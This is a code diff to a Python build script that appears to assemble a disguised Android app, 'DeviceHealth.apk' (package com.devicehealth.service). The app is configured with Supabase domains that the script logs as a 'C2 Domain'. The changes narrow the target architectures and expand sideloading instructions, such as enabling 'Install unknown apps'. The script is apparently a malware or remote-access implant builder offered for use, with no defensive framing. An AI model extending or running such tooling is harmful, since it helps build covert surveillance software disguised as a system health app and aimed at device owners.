@@ -397,8 +397,8 @@ def main():
     parser.add_argument("--domain", help="Primary Supabase domain")
     parser.add_argument("--domain2", help="Secondary Supabase domain")
     parser.add_argument("--apikey", help="Supabase API key")
-    parser.add_argument("--arch", default="arm64,arm",
-                        help="Target architectures, comma-separated (default: arm64,arm). Options: arm64, arm, x86_64, x86")
+    parser.add_argument("--arch", default="arm64",
+                        help="Target architecture (default: arm64). Options: arm64, x86_64")
     parser.add_argument("--output", default="DeviceHealth.apk", help="Output APK filename")
     args = parser.parse_args()
 
@@ -423,12 +423,14 @@ def main():
         log("  .env keys: VITE_SUPABASE_URL, VITE_SUPABASE_PUBLISHABLE_KEY", "ERR")
         sys.exit(1)
 
-    # Parse arch list
+    # Parse arch list (32-bit arm/x86 require CGO + Android NDK, not supported)
     archs = [a.strip() for a in args.arch.split(",")]
-    valid_archs = {"arm64", "arm", "x86_64", "x86"}
+    valid_archs = {"arm64", "x86_64"}
     for a in archs:
         if a not in valid_archs:
-            log(f"Invalid architecture: {a}. Valid: {', '.join(valid_archs)}", "ERR")
+            log(f"Invalid architecture: {a}. Valid: {', '.join(sorted(valid_archs))}", "ERR")
+            if a in ("arm", "x86"):
+                log("32-bit targets require Android NDK (CGO). Use arm64 or x86_64.", "ERR")
             sys.exit(1)
 
     log(f"C2 Domain: {domain1}")
@@ -495,10 +497,12 @@ def main():
     print(f"  Install: adb install {args.output}")
     print(f"  Or transfer {args.output} to device and install")
     print()
-    print("  If 'App not installed' — check:")
-    print("    1. 'Install unknown apps' is enabled for your file manager")
-    print("    2. No previous version installed with a different signature")
-    print("       (uninstall first: adb uninstall com.devicehealth.service)")
+    print("  If 'App not installed':")
+    print("    1. Uninstall any previous version first (different signature blocks install):")
+    print("       adb uninstall com.devicehealth.service")
+    print("       Or: Settings > Apps > Device Health > Uninstall")
+    print("    2. Enable 'Install unknown apps' for your file manager/browser")
+    print("    3. Device must be Android 6.0+ (Marshmallow) and 64-bit (arm64)")
     print()
 
 
